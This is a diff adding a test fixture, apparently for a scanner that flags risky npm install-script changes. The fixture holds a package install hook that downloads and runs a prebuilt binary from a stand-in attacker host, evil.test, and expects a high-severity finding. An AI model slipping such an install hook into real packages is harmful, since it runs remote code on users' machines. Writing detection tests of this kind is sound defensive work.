@@ -1,0 +1,6 @@
+eco: npm
+note: a native build swapped for a prebuilt binary downloaded from any host, with a source fallback
+meta_old: {scripts: {install: node-gyp rebuild}}
+meta_new: {scripts: {install: 'prebuild-install --download https://evil.test/addon.tar.gz || node-gyp rebuild'}}
+expect:
+- {id: npm-install-script-new, min_severity: high}
